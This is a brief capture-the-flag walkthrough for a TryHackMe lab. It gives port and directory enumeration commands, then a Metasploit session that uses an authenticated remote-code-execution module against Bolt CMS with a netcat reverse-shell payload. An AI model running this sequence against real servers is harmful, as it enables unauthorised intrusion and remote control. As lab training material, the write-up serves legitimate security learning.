# Room
https://tryhackme.com/room/bolt

# Task 1 - Deploy
Deploy VM

# Task 2 - Gain access
* Enumeration - rustscan
```
rustscan -a 10.10.219.59                                                                           
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.                                                                                  
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |                                                                                  
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |                                                                                  
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'                                                                                  
The Modern Day Port Scanner.                                                                                                              
________________________________________                                                                                                  
: https://discord.gg/GFrQsGy           :                                                                                                  
: https://github.com/RustScan/RustScan :                                                                                                  
 --------------------------------------         
```
* Enumeration - nmap
```
nmap -A -T4 10.10.219.59 | tee nmap.txt
```
* Enumeration - gobuster
```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://10.10.219.59:8000 -t 40
```
* Enumeration - web browsing
```
Found creds during normal web browsing
```
* Initial access
```
Login with the creds found via normal web browsing http://10.10.219.59:8000/bolt
```
* Research - exploit db
  * Search exploit db for content related to the CMS
  * https://www.exploit-db.com/
* With an exploit found, load metasploit and execute what you found
```
msfconsole

msf6 > search bolt cms

msf6 > use 0
[*] Using configured payload cmd/unix/reverse_netcat
msf6 exploit(unix/webapp/bolt_authenticated_rce) > show options

msf6 exploit(unix/webapp/bolt_authenticated_rce) > set password password_here
password => password_here
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set rhosts 10.10.80.43
rhosts => 10.10.80.43
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set username username_here
username => username_here
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set lhost tun0
lhost => a.b.c.d
msf6 exploit(unix/webapp/bolt_authenticated_rce) > run

[*] Started reverse TCP handler on a.b.c.d:4444 
[*] Executing automatic check (disable AutoCheck to override)
[+] The target is vulnerable. Successfully changed the /bolt/profile username to PHP $_GET variable "sgsla".
[*] Found 2 potential token(s) for creating .php files.
[+] Deleted file szgshefaph.php.
[+] Used token 74c8b43ca608b46ac367cbd9f4 to create rcfhhrrbzurc.php.
```
* Grab the flag